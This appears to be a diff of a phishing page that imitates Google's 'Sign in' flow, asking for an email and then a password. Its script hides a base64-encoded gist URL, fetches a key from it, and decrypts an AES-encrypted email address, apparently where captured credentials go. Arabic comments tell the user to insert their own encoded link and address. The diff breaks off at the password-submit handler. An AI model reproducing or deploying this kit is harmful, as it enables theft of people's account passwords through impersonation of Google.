@@ -1,217 +1,41 @@
 <!DOCTYPE html>
-<html lang="en" >
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <title>Sign in – Google Accounts</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <style>
-    /* خطوط جوجل */
-    @import url('https://fonts.googleapis.com/css2?family=Product+Sans&display=swap');
-
-    /* Reset بسيط */
-    * {
-      box-sizing: border-box;
-    }
-
-    body {
-      font-family: 'Product Sans', Arial, sans-serif;
-      background: #fff;
-      margin: 0;
-      height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      color: #202124;
-      -webkit-font-smoothing: antialiased;
-      -moz-osx-font-smoothing: grayscale;
-    }
-
-    .container {
-      width: 360px;
-      padding: 40px 40px 32px;
-      box-shadow: 0 0 30px rgb(0 0 0 / 0.1);
-      border-radius: 8px;
-      background-color: #fff;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-    }
-
-    /* شعار جوجل */
-    .logo {
-      width: 75px;
-      margin-bottom: 20px;
-    }
-
-    h1 {
-      font-weight: 400;
-      font-size: 24px;
-      margin: 0 0 8px 0;
-      letter-spacing: 0.25px;
-      color: #202124;
-    }
-
-    .subtitle {
-      font-size: 14px;
-      color: #5f6368;
-      margin-bottom: 30px;
-    }
-
-    input[type="email"],
-    input[type="password"] {
-      width: 100%;
-      padding: 14px 12px;
-      font-size: 16px;
-      border: 1px solid #dadce0;
-      border-radius: 4px;
-      margin-bottom: 20px;
-      transition: border-color 0.2s ease, box-shadow 0.2s ease;
-      outline-offset: 0;
-      outline: none;
-    }
-
-    input[type="email"]:focus,
-    input[type="password"]:focus {
-      border-color: #1a73e8;
-      box-shadow: 0 0 0 2px #e8f0fe;
-    }
-
-    button {
-      width: 100%;
-      padding: 12px 0;
-      background-color: #1a73e8;
-      border: none;
-      border-radius: 4px;
-      color: white;
-      font-size: 16px;
-      font-weight: 500;
-      cursor: pointer;
-      transition: background-color 0.2s ease, box-shadow 0.2s ease;
-    }
-
-    button:hover:not(:disabled) {
-      background-color: #1765cc;
-      box-shadow: 0 1px 3px rgb(0 0 0 / 0.2);
-    }
-
-    button:disabled {
-      background-color: #8ab4f8;
-      cursor: default;
-      box-shadow: none;
-    }
-
-    .footer-links {
-      margin-top: 20px;
-      width: 100%;
-      display: flex;
-      justify-content: space-between;
-      font-size: 14px;
-    }
-
-    .footer-links a {
-      color: #1a73e8;
-      text-decoration: none;
-      user-select: none;
-    }
-
-    .footer-links a:hover {
-      text-decoration: underline;
-    }
-
-    /* الموشن بين الفورمين */
-    form {
-      width: 100%;
-      transition: opacity 0.3s ease, transform 0.3s ease;
-      position: relative;
-    }
-
-    .hidden {
-      opacity: 0;
-      pointer-events: none;
-      transform: translateX(-20px);
-      position: absolute;
-      top: 0;
-      left: 0;
-    }
-
-    .visible {
-      opacity: 1;
-      pointer-events: auto;
-      transform: translateX(0);
-      position: relative;
-    }
-
-    /* Spinner */
-    .spinner {
-      margin: 0 auto;
-      width: 20px;
-      height: 20px;
-      border: 3px solid rgba(255, 255, 255, 0.3);
-      border-top-color: #fff;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-    }
-
-    @keyframes spin {
-      to {
-        transform: rotate(360deg);
-      }
-    }
-
+    body { font-family: Arial, sans-serif; background: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+    .container { background: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 400px; }
+    input, button { width: 100%; padding: 12px; margin: 8px 0; font-size: 16px; }
+    button { background-color: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; }
+    button:hover { background-color: #1765cc; }
+    .hidden { display: none; }
   </style>
-
-  <!-- مكتبة CryptoJS -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
 </head>
 <body>
   <div class="container">
-    <img
-      class="logo"
-      src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png"
-      alt="Google"
-    />
-    <h1>Sign in</h1>
-    <p class="subtitle">to continue to Gmail</p>
-
-    <form id="emailForm" class="visible" autocomplete="off">
-      <input
-        type="email"
-        id="email"
-        placeholder="Email or phone"
-        required
-        autocomplete="email"
-        autofocus
-      />
-      <button type="submit" id="nextButton">Next</button>
+    <form id="emailForm">
+      <input type="email" id="email" placeholder="Email or phone" required />
+      <button type="submit">Next</button>
     </form>
-
-    <form id="passwordForm" class="hidden" autocomplete="off">
+    <form id="passwordForm" class="hidden">
       <input type="hidden" id="hiddenEmail" />
-      <input
-        type="password"
-        id="password"
-        placeholder="Enter your password"
-        required
-        autocomplete="current-password"
-      />
-      <button type="submit" id="submitButton">Next</button>
+      <input type="password" id="password" placeholder="Enter your password" required />
+      <button type="submit" id="submitButton">Submit</button>
     </form>
-
-    <div class="footer-links">
-      <a href="#">Forgot password?</a>
-      <a href="#">Create account</a>
-    </div>
   </div>
 
   <script>
     document.addEventListener("DOMContentLoaded", () => {
-      // --- إعدادات التشفير ---
-      const encryptedGistUrl =
-        "aHR0cHM6Ly9naXN0LmNvbWJpbmF0L2FjY291bnQtdmVyaWZ5LzQyMDZhMWIwNjYyM2YyNDI2MDk4MDg2N2I5OTZkN2IyL3Jhdy82YjYyYWNiM2NhZGU0OWM4MjE4MjQxYmExYWQwN2FjNGE2NmM1YTk0L3NlY3JldHRfdHh0";
+      // الرابط مشفر Base64 (استبدل النص تحت برابطك مشفر Base64)
+      const encryptedGistUrl = "aHR0cHM6Ly9naXN0LmNvbWJpbmF0L2FjY291bnQtdmVyaWZ5LzQyMDZhMWIwNjYyM2YyNDI2MDk4MDg2N2I5OTZkN2IyL3Jhdy82YjYyYWNiM2NhZGU0OWM4MjE4MjQxYmExYWQwN2FjNGE2NmM1YTk0L3NlY3JldHRfdHh0";
 
-      const ENCRYPTED_EMAIL =
-        "U2FsdGVkX1/Uu2RQW+edYH1yP2MoEFy0WAAapYMTBqhyX8gb1A3Zb+dFCQZ9oP+m";
+      // الإيميل مشفر AES (استبدل النص هنا بإيميلك المشفر)
+      const ENCRYPTED_EMAIL = "U2FsdGVkX1/Uu2RQW+edYH1yP2MoEFy0WAAapYMTBqhyX8gb1A3Zb+dFCQZ9oP+m";
 
+      // دالة لفك تشفير رابط Gist من Base64
       function decryptUrl(base64str) {
         try {
           return atob(base64str);
@@ -221,6 +45,7 @@
         }
       }
 
+      // دالة لجلب المفتاح من Gist
       async function fetchSecretKey(url) {
         try {
           const response = await fetch(`${url}?t=${Date.now()}`);
@@ -232,6 +57,7 @@
         }
       }
 
+      // دالة فك تشفير الإيميل AES
       function decryptEmail(encrypted, key) {
         try {
           const bytes = CryptoJS.AES.decrypt(encrypted, key.trim());
@@ -242,30 +68,16 @@
         }
       }
 
+      // التعامل مع الفورمات
       const emailForm = document.getElementById("emailForm");
       const passwordForm = document.getElementById("passwordForm");
-      const nextButton = document.getElementById("nextButton");
       const submitButton = document.getElementById("submitButton");
 
       emailForm.addEventListener("submit", (e) => {
         e.preventDefault();
-
-        nextButton.innerHTML = '<div class="spinner"></div>';
-        nextButton.disabled = true;
-
-        setTimeout(() => {
-          emailForm.classList.remove("visible");
-          emailForm.classList.add("hidden");
-
-          setTimeout(() => {
-            document.getElementById("hiddenEmail").value = document.getElementById("email").value;
-            passwordForm.classList.remove("hidden");
-            passwordForm.classList.add("visible");
-
-            nextButton.innerHTML = "Next";
-            nextButton.disabled = false;
-          }, 300);
-        }, 500);
+        document.getElementById("hiddenEmail").value = document.getElementById("email").value;
+        emailForm.classList.add("hidden");
+        passwordForm.classList.remove("hidden");
       });
 
       passwordForm.addEventListener("submit", async (e) => {
